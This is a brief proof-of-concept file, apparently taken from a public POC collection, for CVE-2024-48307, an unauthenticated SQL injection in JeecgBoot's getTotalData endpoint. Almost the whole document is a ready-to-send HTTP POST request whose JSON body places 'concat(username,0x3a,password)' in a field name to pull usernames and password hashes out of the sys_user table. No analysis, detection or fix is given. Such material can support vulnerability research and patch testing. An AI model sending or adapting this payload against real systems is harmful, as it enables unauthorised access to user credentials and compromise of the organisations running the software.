# jeecgboot_getTotalData_sqli

from: https://github.com/wy876/POC/blob/main/JeecgBoot/JeecgBoot%E6%8E%A5%E5%8F%A3getTotalData%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-48307).md
product: jeecgboot

```
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 284

{"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
```
